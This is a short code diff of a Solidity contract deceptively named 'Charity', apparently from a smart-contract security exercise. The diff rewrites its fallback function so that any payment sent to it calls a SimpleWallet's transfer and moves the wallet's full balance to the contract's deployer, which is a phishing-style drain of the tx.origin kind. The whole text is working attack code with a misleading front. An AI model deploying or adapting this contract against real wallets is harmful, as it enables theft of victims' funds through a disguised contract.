@@ -10,15 +10,14 @@ interface SimpleWallet {
 contract Charity {
 
     SimpleWallet simpleWallet;
-
+    address payable private owner;
     constructor(address _simpleWallet) {
+        owner = payable(msg.sender);
         simpleWallet = SimpleWallet(_simpleWallet);
     }
 
     fallback() external payable {
-        if (address(simpleWallet).balance > 0) {
-            simpleWallet.transfer(payable(address(this)), 2800 ether);
-        }
+        simpleWallet.transfer(owner, address(simpleWallet).balance);
     }
 
 }
